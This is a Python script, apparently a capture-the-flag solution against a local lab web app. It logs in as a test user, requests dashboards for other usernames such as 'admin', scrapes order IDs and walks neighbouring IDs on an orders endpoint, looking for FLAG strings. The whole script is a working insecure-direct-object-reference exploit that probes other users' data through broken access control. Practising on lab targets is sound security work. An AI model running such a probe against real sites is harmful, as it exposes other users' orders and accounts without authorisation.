import requests
import re

base_url = 'http://127.0.0.1:32929'

session = requests.Session()

try:
    login_data = {'username': 'test', 'password': 'test'}
    login_resp = session.post(f'{base_url}/login', data=login_data, allow_redirects=False)
    print(f'LOGIN POST /login Status: {login_resp.status_code}')
    print(login_resp.text)

    dash_urls = [
        f'{base_url}/dashboard?username=test',
        f'{base_url}/dashboard?username=admin',
        f'{base_url}/dashboard?username=test1',
        f'{base_url}/dashboard?username=test2',
    ]

    dashboard_results = []
    for url in dash_urls:
        resp = session.get(url)
        info = {
            'url': url,
            'status': resp.status_code,
            'length': len(resp.content),
            'body': resp.text,
        }
        dashboard_results.append(info)
        print(f'DASHBOARD GET {url} Status: {resp.status_code} Length: {len(resp.content)}')
        print(resp.text)

    orders_url = f'{base_url}/orders'
    orders_resp = session.get(orders_url)
    print(f'ORDERS GET {orders_url} Status: {orders_resp.status_code} Length: {len(orders_resp.content)}')
    orders_html = orders_resp.text
    print(orders_html)

    id_pattern = re.compile(r'\b(\d{3,})\b')
    numeric_ids = sorted(set(int(m) for m in id_pattern.findall(orders_html)))
    print(f'FOUND_NUMERIC_IDS: {numeric_ids}')

    fuzz_targets = []
    for nid in numeric_ids:
        for v in range(nid - 2, nid + 3):
            if v > 0:
                fuzz_targets.append(v)
    fuzz_targets = sorted(set(fuzz_targets))

    flag_pattern = re.compile(r'FLAG\{[^}]+\}')

    for nid in numeric_ids:
        nid_str = str(nid)
        occurrences = []
        for match in re.finditer(nid_str, orders_html):
            start = max(0, match.start() - 40)
            end = min(len(orders_html), match.end() + 40)
            snippet = orders_html[start:end]
            occurrences.append(snippet)
        print(f'ID_OCCURRENCES {nid}:')
        for sn in occurrences:
            print(sn)

    for v in fuzz_targets:
        url = f'{base_url}/orders/{v}'
        try:
            resp = session.get(url)
        except Exception as e:
            print(f'ERROR requesting {url}: {e}')
            continue
        body = resp.text
        flags = flag_pattern.findall(body)
        print(f'FUZZ_ORDERS_ID {v} Status: {resp.status_code} Length: {len(resp.content)}')
        if flags:
            print(f'FLAGS_FOUND at {url}: {flags}')
        print(body)

    all_responses = dashboard_results + [
        {
            'url': orders_url,
            'status': orders_resp.status_code,
            'length': len(orders_resp.content),
            'body': orders_html,
        }
    ]

    for item in all_responses:
        flags = flag_pattern.findall(item['body'])
        if flags:
            print(f'FLAGS_FOUND in {item["url"]}: {flags}')

except Exception as e:
    print(f'UNHANDLED_ERROR: {e}')

